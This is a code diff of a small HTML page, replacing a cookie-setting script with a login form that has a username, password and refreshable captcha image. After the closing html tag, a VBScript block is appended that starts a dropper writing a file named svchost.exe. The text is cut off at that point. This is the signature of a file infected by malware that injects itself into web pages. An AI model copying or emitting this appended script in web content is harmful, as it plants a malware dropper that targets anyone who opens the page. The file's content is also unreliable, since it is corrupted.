@@ -1,20 +1,27 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
+<html>
+<head lang="en">
     <meta charset="UTF-8">
-    <title>Title</title>
+    <title></title>
 </head>
 <body>
+    <h1>hello</h1>
+    <form action="/index" method="post" enctype="multipart/form-data">
+        <p><input name="user" type="text" placeholder="用户名" /></p>
+        <p><input name="pwd" type="password" placeholder="密码" /></p>
+        <p>
+            <input name='code' type="text" placeholder="验证码" />
+            <img src="/check_code" onclick='ChangeCode();' id='imgCode'>
+        </p>
+        <input type="submit" />
+    </form>
+    <script type="text/javascript">
 
-
-<script>
-    function setCookie(name, value, expires) {
-        var temp = [];
-        var current_date = new Date();
-        current_date.setSeconds(current_date.getSeconds() + 5);
-        document.cookie = name + "= " + value + ";expires=" + current_date.toUTCString();
-    }
-</script>
+        function ChangeCode() {
+            var code = document.getElementById('imgCode');
+            code.src += '?';
+        }
+    </script>
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
